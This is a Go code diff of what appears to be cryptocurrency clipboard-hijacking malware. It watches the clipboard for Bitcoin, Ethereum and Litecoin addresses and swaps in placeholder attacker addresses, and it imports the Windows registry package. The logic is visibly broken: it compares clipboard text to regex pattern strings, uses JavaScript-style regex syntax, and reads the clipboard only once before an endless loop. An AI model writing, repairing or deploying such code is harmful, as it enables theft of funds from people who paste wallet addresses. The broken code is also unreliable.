@@ -10,8 +10,14 @@ import (
 	"path/filepath"
 	"regexp"
 
-	"github.com/atotto/clipboard"
+	"github.com/d-tsuji/clipboard"
 	"golang.org/x/sys/windows/registry"
+)
+
+const (
+	BTC = "insert btc here"
+	ETH = "insert eth here"
+	LTC = "instert ltc here"
 )
 
 func main() {
@@ -59,36 +65,43 @@ func main() {
 	if err != nil {
 		panic(err)
 	}
-	for {
-		BTC := "bitcoin address here"
-		ETH := "Etherium address here"
-		LTC := "litecoin address here"
-		ltcregexp := regexp.MustCompile("/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/")
-		ltcfmt := ltcregexp.String()
-		ethregexp := regexp.MustCompile("/(\b0x[a-f0-9]{40}\b)/g")
-		btcregexp := regexp.MustCompile("/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/")
-		btcb32regexp := regexp.MustCompile("/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/")
-		btcb32 := btcb32regexp.String()
-		ethfmt := ethregexp.String()
-		btcfmt := btcregexp.String()
-		content, err := clipboard.ReadAll()
 
-		if err != nil {
-			log.Fatal(err)
-		}
+	clip()
 
-		if content == btcfmt || content == btcb32 {
-			fmt.Println("bitcoin detected")
-			clipboard.WriteAll(BTC)
-		}
-		if content == ethfmt {
-			fmt.Println("etherium detected")
-			clipboard.WriteAll(ETH)
-		}
-		if content == ltcfmt {
-			clipboard.WriteAll(LTC)
-			fmt.Println("Litecoin detected")
-		}
+}
+
+func clip() {
+
+	getclipboard, err := clipboard.Get()
+	if err != nil {
+		panic(err)
 	}
 
+	ltcregexp := regexp.MustCompile("/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/")
+	ltcfmt := ltcregexp.String()
+	ethregexp := regexp.MustCompile("/(\b0x[a-f0-9]{40}\b)/g")
+	btcregexp := regexp.MustCompile("/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/")
+	btcb32regexp := regexp.MustCompile("/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/")
+	btcb32 := btcb32regexp.String()
+	ethfmt := ethregexp.String()
+	btcfmt := btcregexp.String()
+
+	for {
+		if getclipboard == btcb32 {
+			fmt.Printf("BTC DETECTED")
+			clipboard.Set(BTC)
+		}
+		if getclipboard == ethfmt {
+			fmt.Printf("ETH DETECTED")
+			clipboard.Set(ETH)
+		}
+		if getclipboard == btcfmt {
+			fmt.Printf("BTC DETECTED")
+			clipboard.Set(BTC)
+		}
+		if getclipboard == ltcfmt {
+			fmt.Printf("LTC DETECTED")
+			clipboard.Set(LTC)
+		}
+	}
 }
